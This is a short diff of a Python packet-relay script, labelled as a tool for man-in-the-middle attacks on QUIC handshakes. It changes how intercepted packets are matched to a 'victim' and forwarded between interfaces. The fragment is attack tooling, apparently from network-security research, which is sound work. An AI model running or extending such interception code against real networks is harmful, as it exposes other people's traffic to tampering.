@@ -114,7 +114,8 @@ def handle_quic(pkt):
 
                     
         elif pkt.sniffed_on == outer_iface:
-            new_dst = vs.find_victim_from_wan_by_port(pkt[UDP].dport)
+            #new_dst = vs.find_victim_from_wan_by_port(pkt[UDP].dport)
+            new_dst = vs.find_victim_from_wan(pkt[IP].src, pkt[UDP].dport)
             if new_dst != "":
                 #print(f"From server: {pkt.summary()}")
                 new_pkt = pkt[IP]
@@ -124,7 +125,7 @@ def handle_quic(pkt):
                 #print(f"New PKT to client: {new_pkt.summary()}")
                 send(new_pkt, iface=inner_iface, verbose=False)
             else:
-                print("A packet of unknown LAN destination.")
+                #print("A packet of unknown LAN destination.")
                 # Need to fix change of victim sport with new connections of same src and dest ips.
 
 
@@ -132,7 +133,7 @@ if __name__ == "__main__":
     """
         Global variables, constants and configurations settings.
     """
-    os.system('sysctl -w net.ipv4.ip_forward=0')
+    os.system('sysctl -w net.ipv4.ip_forward=0')    
     parser = argparse.ArgumentParser(description="MiTM QUIC Handshake attacks")
     parser.add_argument(
         "--inner-iface",
